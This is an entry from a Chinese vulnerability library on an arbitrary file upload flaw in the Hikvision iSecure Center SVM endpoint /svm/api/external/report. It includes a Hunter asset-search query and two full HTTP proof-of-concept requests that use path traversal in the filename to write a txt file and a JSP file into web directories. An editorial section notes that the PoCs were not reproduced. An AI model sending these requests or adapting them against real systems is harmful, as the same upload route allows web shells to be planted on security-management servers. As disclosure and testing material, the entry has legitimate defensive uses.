---
source: "wy876 漏洞文库"
id: "vw-c9305a4c20a297f4f069f557"
entity_id: "ve-c9305a4c20a297f4f069f557"
schema_version: "1"
title: "海康威视iSecureCenter综合安防管理平台 svm文件上传漏洞"
product: "Hikvision iSecure Center SVM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "els/static或eportal两路径，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86iSecureCenter%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0svm%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xogv2fbt69o0h9gq"
source_status: "recorded"
previous_fofa_unverified: "查询语法：**"
hunter: "app.name==\"Hikvision 海康威视 iSecure Center\""
---

# 海康威视iSecureCenter综合安防管理平台 svm文件上传漏洞

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision iSecure Center SVM
- 本文讨论：svm/api/external/report filename穿越上传
- 版本、权限与配置前提：els/static或eportal两路径，版本未知
- 资料类型：上传PoC重复/部署变体；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅访问接口不是漏洞判据，第一txt只能证明写入不证明JSP执行
- 第二路径hikvision小写与848大写Hikvision存在Linux路径差异，需保留核验
- 同848动作且追加els部署证据，不能简单舍弃变体
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 路径映射/认证/具体构建待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 1、漏洞描述
<font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，获取边缘节点数据，实现安防信息化集成与联动，以电子地图为载体，融合各系统能力实现丰富的智能应用。HIKVISION iSecure Center平台基于“统一软件技术架构”先进理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、统一配置、统一管理和统一调度。海康威视isecure center 综合安防管理平台svm存在任意文件上传漏洞</font>

# <font style="color:rgb(0, 0, 0);">2、影响版本</font>
<font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台 </font>


# <font style="color:rgb(0, 0, 0);">3、资产测绘</font>
**hunter查询语法：**

`app.name=="Hikvision 海康威视 iSecure Center"`

# 4、漏洞复现
POC：

`https://ip/svm/api/external/report`

判断是否存在该漏洞


## POC1
```http
POST /svm/api/external/report HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_371
Host: ip
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 172

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../../../tomcat85linux64.1/webapps/els/static/1ndex.txt"

index
--00content0boundary00--

```


上传文件位置

`https://ip/els/static/1ndex.txt`


## POC2
```http
POST /svm/api/external/report HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
Content-Length: 308

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%out.print("test");%>

------WebKitFormBoundary9PggsiM755PLa54a--


```


上传文件位置

```plain
https://xx.xx.xx.xx/portal/ui/login/..;/..;/new.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xogv2fbt69o0h9gq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
